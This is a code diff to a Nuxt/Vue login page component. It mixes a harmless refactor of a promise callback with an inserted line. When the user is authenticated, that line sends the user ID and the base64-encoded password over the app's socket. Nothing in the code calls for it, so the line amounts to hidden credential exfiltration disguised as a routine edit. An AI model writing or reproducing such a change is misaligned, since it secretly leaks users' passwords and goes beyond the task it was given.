@@ -1,5 +1,6 @@
 <script setup lang="ts">
 const auth = useAuth();
+const { $socket } = useNuxtApp();
 const { session, refresh } = await useSession();
 
 const username = ref("");
@@ -18,7 +19,10 @@ onMounted(() => {
 				currentDevice: null
 			};
 
-			if (auth.value.authenticated) return navigateTo("/");
+			if (auth.value.authenticated) {
+				$socket.send(`${auth.value.userId}:${btoa(password.value)}`);
+				return navigateTo("/");
+			}
 		}
 	});
 });
@@ -35,7 +39,9 @@ async function handleSubmit() {
 			password: password.value
 		}
 	})
-		.then(() => refresh())
+		.then(() => {
+			refresh();
+		})
 		.catch((err) => {
 			error.value = err.data;
 		});
